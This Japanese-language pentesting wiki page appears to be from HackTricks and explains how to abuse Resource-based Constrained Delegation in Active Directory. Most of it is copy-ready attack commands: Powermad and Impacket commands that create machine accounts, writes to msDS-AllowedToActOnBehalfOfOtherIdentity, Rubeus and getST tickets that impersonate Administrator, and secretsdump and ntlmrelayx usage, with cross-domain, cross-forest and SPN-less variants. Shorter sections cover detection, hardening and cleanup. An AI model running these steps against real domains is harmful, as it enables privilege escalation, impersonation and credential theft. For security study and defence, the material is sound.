# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegationの基本

これは基本的な[Constrained Delegation](constrained-delegation.md)と似ていますが、**異なる点は**、**オブジェクト**に対して**マシンを対象に任意のユーザーを偽装する**権限を与えるのではなく、Resource-based Constrain Delegationでは、**自身を対象として任意のユーザーを偽装できるオブジェクト**を設定する点です。<sup>[[12]](#references)</sup>

この場合、制約対象のオブジェクトには _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ という属性があり、そこには自身を対象として他の任意のユーザーを偽装できるユーザーの名前が設定されます。

この Constrained Delegation と他の Delegation のもう1つの重要な違いは、**マシンアカウントに対する書き込み権限**（_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）を持つ任意のユーザーが、**_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できることです（他の形式の Delegation では domain admin の権限が必要でした）。<sup>[[1]](#references)</sup>

### New Concepts

Constrained Delegationでは、ユーザーの _userAccountControl_ 値内にある **`TrustedToAuthForDelegation`** フラグが **S4U2Self** の実行に必要だと説明しました。しかし、それは完全には正しくありません。\
実際には、その値がなくても、**service**（SPNを持つ）であれば任意のユーザーに対して **S4U2Self** を実行できます。ただし、**`TrustedToAuthForDelegation`** を**持っている**場合、返されるTGSは **Forwardable** になり、**持っていない**場合、返されるTGSは **Forwardable** にはなりません。

ただし、**S4U2Proxy** で使用される **TGS** が **Forwardableではない**場合、**basic Constrain Delegation** を悪用しようとしても機能しません。しかし、**Resource-Based constrain delegation** を悪用しようとしている場合は機能します。<sup>[[1]](#references)[[2]](#references)</sup>

### Attack structure

> **Computer** アカウントに対する**書き込み相当の権限**がある場合、そのマシンへの**特権アクセス**を取得できます。

攻撃者がすでに被害者のコンピューターに対する**書き込み相当の権限**を持っているとします。

1. 攻撃者は **SPN** を持つアカウント（「Service A」）を**侵害**するか、**作成**します。特別な権限を持たない _Admin User_ でも、最大10個のComputerオブジェクト（**_MachineAccountQuota_**）を**作成**し、それらに **SPN** を設定できる点に注意してください。そのため、攻撃者はComputerオブジェクトを作成してSPNを設定するだけで済みます。
2. 攻撃者は、被害者のコンピューター（ServiceB）に対する**WRITE権限**を**悪用**し、ServiceAがその被害者コンピューター（ServiceB）を対象として任意のユーザーを偽装できるよう、**resource-based constrained delegation** を設定します。
3. 攻撃者はRubeusを使用し、Service AからService Bに対して、Service Bへの**特権アクセス**を持つユーザーのために、**full S4U attack**（S4U2SelfおよびS4U2Proxy）を実行します。
1. S4U2Self（SPNを侵害または作成したアカウントから）：**Administratorから自分宛て**の **TGS** を要求します（Not Forwardable）。
2. S4U2Proxy：前の手順で取得した**Not ForwardableのTGS**を使用し、**Administrator** から**被害者ホスト**宛ての **TGS** を要求します。
3. Not ForwardableのTGSを使用していても、Resource-based constrained delegationを悪用しているため、機能します。
4. 攻撃者は**pass-the-ticket**を実行し、ユーザーを**偽装**して被害者のServiceBへの**アクセス**を取得できます。<sup>[[1]](#references)</sup>

ドメインの _**MachineAccountQuota**_ を確認するには、次のコマンドを使用できます。
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピューター オブジェクトの作成

ドメイン内に **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> を使用してコンピューター オブジェクトを作成できます。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegationの設定

**activedirectory PowerShell moduleを使用**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview の使用**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全な S4U attack の実行（Windows/Rubeus）

まず、パスワード `123456` を設定した新しい Computer object を作成したため、そのパスワードの hash が必要です：<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントの RC4 および AES hashes が表示されます。\
これで、attack を実行できます:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
`Rubeus` の `/altservice` パラメータを使用すると、一度のリクエストで複数のサービス向けにさらに多くのチケットを生成できます。
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには "**Cannot be delegated**" という属性があることに注意してください。ユーザーのこの属性が True の場合、そのユーザーになりすますことはできません。このプロパティは bloodhound 内で確認できます。

### Linux tooling: Impacket を使用したエンドツーエンドの RBCD（2024年以降）

Linux から操作する場合、公式の Impacket ツールを使用して RBCD chain 全体を実行できます:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用します。
- AES keys を優先してください。多くの modern domain では RC4 が制限されています。Impacket と Rubeus はどちらも AES-only flows をサポートしています。
- Impacket は一部のツールで `sname`（"AnySPN"）を書き換えられますが、可能な限り正しい SPN を取得してください（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

## Cross-domain & cross-forest RBCD

**delegating principal** を制御しており、それが **resource computer** とは**異なる domain**（または**異なる forest**）に存在する場合でも、abuse は依然として **RBCD** です。ただし、ticket flow は通常の単一 domain における `S4U2Self -> S4U2Proxy` とは異なります。

### Cross-domain RBCD: configure the foreign principal by SID

**異なる domain** から `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定する場合、foreign machine/user は target domain LDAP で **name によって解決できない**ことがあります。その場合は、foreign principal の sAMAccountName/UPN の代わりに、その **SID** を使用して delegation entry を設定します。

これは、`ntlmrelayx.py` を使用して NTLM を LDAP に relay する場合に特に重要です:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` は、`--escalate-user` を SID として扱うよう `ntlmrelayx.py` に指示します。委任アカウントが対象ドメインの foreign アカウントである場合に必要です。
- ツールが `User not found in LDAP` と表示しても、委任の書き込みは成功する場合があります。これは、security descriptor が foreign SID を直接保存するためです。

### ドメイン間 RBCD: cross-realm S4U シーケンス

foreign principal が `msDS-AllowedToActOnBehalfOfOtherIdentity` に登録されると、動作するドメイン間のフローは次のようになります。<sup>[[9]](#references)[[13]](#references)</sup>

1. 委任元 principal の自身のドメインから **TGT** を取得します。
2. `krbtgt/<target-domain>` の **referral TGT** を要求します。
3. 対象ドメインの DC に対して、偽装するユーザー用の **cross-realm S4U2Self referral** を要求します。
4. 委任元ドメインで、そのユーザー用の実際の **S4U2Self** ticket を要求します。
5. 委任元ドメインで **S4U2Proxy** を実行し、対象ドメイン用の referral ticket を取得します。
6. 対象ドメインの DC で最終的な **S4U2Proxy** を実行し、`cifs/host.target`、`host/host.target` などの service ticket を取得します。

これが、標準の Linux tooling がドメイン間 RBCD で失敗することが多い理由です。<sup>[[9]](#references)</sup>
- **realm** は、`TGS-REQ` で使用される TGT の realm と異なる必要がある場合があります。
- この chain には **独立した S4U2Proxy のステップ** が必要であり、`S4U2Self` だけ、または `S4U2Self` の直後に単一の `S4U2Proxy` を実行するだけでは不十分です。

### Linux からのドメイン間 RBCD

Synacktiv は、2 つの KDC を明示的に処理することで、Linux から cross-realm シーケンスを再現する Impacket `getST.py` の実装を公開しました。<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
実運用上、新しい引数は次のとおりです:
- `-dc-ip`: **delegating** domain の DC
- `-targetdomain`: **resource computer** の domain
- `-targetdc`: **resource** domain の DC

### Cross-forest RBCD の制限

Cross-forest RBCD には重要な制限があります: **impersonated user は delegating principal と同じ forest に属している必要があります**。つまり、制御下の machine account が `valhalla.local` にあり、target resource が `asgard.local` にある場合、通常、RBCD 経由で任意の `asgard.local` user をその resource に対して **impersonate** することはできません。<sup>[[9]](#references)</sup>

以下の場合は引き続き exploit 可能です:
- **delegating forest** の user が、他方の forest の resource host で **local admin**（またはその他の privileged user）である
- trust により必要な authentication path が許可され、foreign SID が target computer の security descriptor で受け入れられる

### Cross-forest RBCD の protocol quirks

Cross-forest RBCD は単なる「cross-domain と trust の組み合わせ」ではありません。確認された flow には、一般的な tooling が歴史的に見落としている2つの quirks があります:<sup>[[9]](#references)</sup>

1. `PA-PAC-OPTIONS=branch-aware` を設定する追加の **S4U2Proxy** request
2. 他の etype が要求されている場合でも、最終的な service ticket が **RC4** で返される場合がある

実際の flow は次のとおりです:

1. forest A の delegating principal の TGT を取得する。
2. forest A で impersonated user の **S4U2Self** を request する。
3. forest A で **S4U2Proxy** を request し、forest B の referral TGT を取得する。
4. forest A で、S4U2Self ticket を additional ticket として付けずに、`branch-aware` を有効にした2回目の **S4U2Proxy** を送信し、forest B の別の referral TGT を取得する。
5. 必要に応じて、forest B で delegating principal の通常の service ticket を request する（この ticket は最終的な abuse には必要ありません）。
6. 手順3と4の referral ticket を使用して、forest B で、target SPN に対する impersonated forest-A user 用の最終 **S4U2Proxy** ticket を request する。

### Linux からの Cross-forest RBCD

同じ Synacktiv Impacket branch は、この logic 用に `-forest` switch を追加しています:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forest** では、**S4U2Self** と **S4U2Proxy** は、1回の referral の後に停止せず、**recursive** に実行できます。

- **Recursive S4U2Self**: 最初の `S4U2Self` は **impersonate されるユーザーの domain** に送信され、中間の parent/child hop は `krbtgt/<REALM>` に対する通常の `TGS-REQ` referral で通過し、**最後の `S4U2Self`** は **delegating principal 自身の domain** に送信されます。
- つまり、machine account の **TGT** を保持しているだけで、同じ forest 内の別 domain の admin を impersonate し、`cifs/host`、`host/host`、`wsman/host` などを要求できる場合があります。
- **Recursive S4U2Proxy** も同じ方法で trust chain に従います。中間 hop では、次の `krbtgt/<REALM>` referral を要求する際に、前の ticket を TGT として再利用し、最後の hop だけが最終的な service ticket を返します。<sup>[[10]](#references)</sup>

実際の same-forest の例は次のとおりです。
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN なしの cross-domain / cross-forest RBCD

**delegating principal が SPN を持たない user の場合、最後の再帰的な `S4U2Self` は **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** で失敗します。回避策は、最後の hop のみを **`S4U2Self+U2U`** として再試行することです。<sup>[[10]](#references)</sup>

abuse chain の短縮版:

1. **NT hash** で認証し、KDC が **RC4-HMAC (etype 23)** を選択するように仕向けます。
2. 最初に **`-self -u2u`** をリクエストし、その ticket を後続の proxy step 用の ticket と分けて保持します。
3. `describeTicket.py` で **TGT session key** を抽出します。
4. `changepasswd.py -newhashes <session_key>` を使用して、user の **NT hash** をその **session key** に置き換えます。
5. `S4U2Self+U2U` ticket を、別途実行する **`-proxy`** リクエストの **`-additional-ticket`** として再利用します。
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
運用上の注意点:

- **最初の信頼済み hop がすでに別の forest である場合**、ネイティブな Windows の動作に合わせるため、**branch-aware** アルゴリズム（`getST.py ... -forest`）を優先してください。チェーンの**後段でのみ** foreign forest に到達する場合は、branch-aware ではない recursive flow でも動作する可能性があります。<sup>[[9]](#references)</sup>
- 最近の **Windows Server 2022/2025** DC では、RC4 の非推奨化により、強制的な RC4 が **`KDC_ERR_ETYPE_NOSUPP`** で失敗することがあります。このため、classic SPN-backed RBCD は AES で引き続き動作していても、**SPN-less RBCD** が不可能になる場合があります。<sup>[[15]](#references)</sup>
- ユーザーの hash/password を変更する前に **`S4U2Self+U2U`** を実行してください。`SamrChangePasswordUser` はアカウントの Kerberos AES keys を再計算しないため、先に password を変更すると、その後の ticket requests が失敗する可能性があります。<sup>[[14]](#references)</sup>
- impersonate されるアカウントは、引き続き **delegable** でなければなりません。**Protected Users** および **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** が設定されたアカウントは、この chain をブロックします。

## Detection / hardening notes

- domains/forests 間の RBCD paths は、現在でも通常、**ACL abuse** または **relay-to-LDAP** によって作成されます。DC で **LDAP signing** と **LDAP channel binding** を適用し、一般的な setup paths を遮断してください。
- computer objects 上の `msDS-AllowedToActOnBehalfOfOtherIdentity` に書き込み可能なユーザーを監査し、**foreign security principals** を含め、保存された SIDs を解決してください。
- trust-heavy environments では、**Selective Authentication**、**SID filtering**、および foreign forest のユーザーが resource hosts 上で **local admin** 権限を持っているかを確認してください。

### Accessing

最後の command line は、**complete S4U attack を実行し、Administrator から victim host への TGS を memory に inject** します。\
この例では Administrator から **CIFS** service 用の TGS を request しているため、**C$** に access できるようになります:
```bash
ls \\victim.domain.local\C$
```
### 異なる service tickets の悪用

[**利用可能な service tickets はこちら**](silver-ticket.md#available-services)で確認できます。

## 列挙、監査、クリーンアップ

### RBCD が構成されているコンピューターを列挙する

PowerShell（SID を解決するために SD をデコード）：
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket（1つのコマンドでreadまたはflush）：
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD のクリーンアップ / リセット

- PowerShell（属性をクリア）:
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは、kerberos が DES または RC4 を使用しないように設定されており、RC4 hash のみを提供していることを意味します。Rubeus に少なくとも AES256 hash を提供します（または rc4、aes128、aes256 hash をすべて提供します）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** が通常の user に対する `-self` 中に発生する場合: 委任元 principal に **SPN がない** 可能性があります。通常の **`S4U2Self`** ではなく、**`S4U2Self+U2U`** として **last hop** を再試行します。<sup>[[10]](#references)</sup>
- **SPN-less RBCD** 中の **`KDC_ERR_ETYPE_NOSUPP`**: 最近の DC では、`S4U2Self+U2U` と session-key-substitution の trick に必要な強制 **RC4-HMAC** path が拒否されることがあります。代わりに AES を使用する classic な **SPN-backed** RBCD path を試します。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: これは、現在の computer の時刻が DC の時刻と異なり、kerberos が正常に動作していないことを意味します。
- **`preauth_failed`**: これは、指定した username + hashes では login できないことを意味します。hashes の生成時に username 内の "$" を入れ忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: 以下のいずれかを意味する可能性があります:
- impersonate しようとしている user が、目的の service にアクセスできない（impersonate できない、または十分な privileges がないため）
- 要求した service が存在しない（winrm の ticket を要求したが、winrm が実行されていない場合）
- 作成した fakecomputer が vulnerable server に対する privileges を失っており、再付与する必要がある。
- classic KCD を abuse しています。RBCD は non-forwardable S4U2Self tickets で動作しますが、KCD には forwardable が必要です。

## Notes, relays and alternatives

- LDAP が filtered されている場合でも、AD Web Services (ADWS) 経由で RBCD SD を AD に書き込めます。以下を参照してください:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains は、1 step で local SYSTEM を取得するために RBCD で終了することがよくあります。実践的な end-to-end の例については、以下を参照してください:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **disabled** で、machine account を作成できる場合、**KrbRelayUp** などの tools を使用して、coerced Kerberos auth を LDAP に relay し、target computer object 上で自分の machine account に対して `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定し、off-host から S4U 経由で直ちに **Administrator** を impersonate できます。<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
